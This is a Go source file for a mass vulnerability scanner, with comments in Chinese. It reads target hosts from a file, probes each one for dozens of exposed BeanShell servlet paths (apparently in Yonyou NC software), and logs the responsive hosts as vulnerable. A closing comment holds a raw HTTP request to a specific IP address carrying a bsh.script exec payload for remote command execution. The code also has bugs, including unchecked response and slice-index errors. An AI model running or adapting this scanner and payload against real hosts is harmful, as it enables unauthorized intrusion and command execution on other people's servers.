package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

var (
	ips []string
)

func main() {
	Read_ipfile("C:\\Users\\HoAd\\Desktop\\go_project\\bin\\1.txt")
	//Gettest()
}

//读文件
func Read_ipfile(file string) {
	fi, err := os.Open(file)
	if err != nil {
		panic(err)
	}
	r := bufio.NewReader(fi)
	for {
		line, err := r.ReadString('\n')
		if err != nil && err != io.EOF {
			panic(err)
		}
		if err == io.EOF {
			break
		}
		line = strings.TrimSpace(line)
		ips = append(ips, line)

	}

	for i := 0; i < 100; i++ {
		Gettest(ips[i])
	}

}

//检测
func Gettest(Hunterurl string) {
	keys := [60]string{"/service/~aim/bsh.servlet.BshServlet",
		"/service/~alm/bsh.servlet.BshServlet",
		"/service/~ampub/bsh.servlet.BshServlet",
		"/service/~arap/bsh.servlet.BshServlet",
		"/service/~aum/bsh.servlet.BshServlet",
		"/service/~cc/bsh.servlet.BshServlet",
		"/service/~cdm/bsh.servlet.BshServlet",
		"/service/~cmp/bsh.servlet.BshServlet",
		"/service/~ct/bsh.servlet.BshServlet",
		"/service/~dm/bsh.servlet.BshServlet",
		"/service/~erm/bsh.servlet.BshServlet",
		"/service/~fa/bsh.servlet.BshServlet",
		"/service/~fac/bsh.servlet.BshServlet",
		"/service/~fbm/bsh.servlet.BshServlet",
		"/service/~ff/bsh.servlet.BshServlet",
		"/service/~fip/bsh.servlet.BshServlet",
		"/service/~fipub/bsh.servlet.BshServlet",
		"/service/~fp/bsh.servlet.BshServlet",
		"/service/~fts/bsh.servlet.BshServlet",
		"/service/~fvm/bsh.servlet.BshServlet",
		"/service/~gl/bsh.servlet.BshServlet",
		"/service/~hrhi/bsh.servlet.BshServlet",
		"/service/~hrjf/bsh.servlet.BshServlet",
		"/service/~hrpd/bsh.servlet.BshServlet",
		"/service/~hrpub/bsh.servlet.BshServlet",
		"/service/~hrtrn/bsh.servlet.BshServlet",
		"/service/~hrwa/bsh.servlet.BshServlet",
		"/service/~ia/bsh.servlet.BshServlet",
		"/service/~ic/bsh.servlet.BshServlet",
		"/service/~iufo/bsh.servlet.BshServlet",
		"/service/~modules/bsh.servlet.BshServlet",
		"/service/~mpp/bsh.servlet.BshServlet",
		"/service/~obm/bsh.servlet.BshServlet",
		"/service/~pu/bsh.servlet.BshServlet",
		"/service/~qc/bsh.servlet.BshServlet",
		"/service/~sc/bsh.servlet.BshServlet",
		"/service/~scmpub/bsh.servlet.BshServlet",
		"/service/~so/bsh.servlet.BshServlet",
		"/service/~so2/bsh.servlet.BshServlet",
		"/service/~so3/bsh.servlet.BshServlet",
		"/service/~so4/bsh.servlet.BshServlet",
		"/service/~so5/bsh.servlet.BshServlet",
		"/service/~so6/bsh.servlet.BshServlet",
		"/service/~tam/bsh.servlet.BshServlet",
		"/service/~tbb/bsh.servlet.BshServlet",
		"/service/~to/bsh.servlet.BshServlet",
		"/service/~uap/bsh.servlet.BshServlet",
		"/service/~uapbd/bsh.servlet.BshServlet",
		"/service/~uapde/bsh.servlet.BshServlet",
		"/service/~uapeai/bsh.servlet.BshServlet",
		"/service/~uapother/bsh.servlet.BshServlet",
		"/service/~uapqe/bsh.servlet.BshServlet",
		"/service/~uapweb/bsh.servlet.BshServlet",
		"/service/~uapws/bsh.servlet.BshServlet",
		"/service/~vrm/bsh.servlet.BshServlet",
	}
	for i, key := range keys {
		resp, err := http.Get("http://" + Hunterurl + key)
		s := fmt.Sprintf("测试第%d条payload,%s", i, key)
		fmt.Println(s)
		if err != nil {
			fmt.Println("6666")
		}
		defer resp.Body.Close()
		if 200 == resp.StatusCode {
			writefile(Hunterurl + key + "存在漏洞")
		}
	}
}

//写入文件
func writefile(urls string) {
	file, err := os.OpenFile("C:\\Users\\HoAd\\Desktop\\go_project\\bin\\3.txt", os.O_RDWR|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close() //延迟文件关闭
	write := bufio.NewWriter(file)
	write.WriteString(urls + "\n")
	write.Flush()
}

/*POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: 124.71.225.183:8899
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("ipconfig");*/
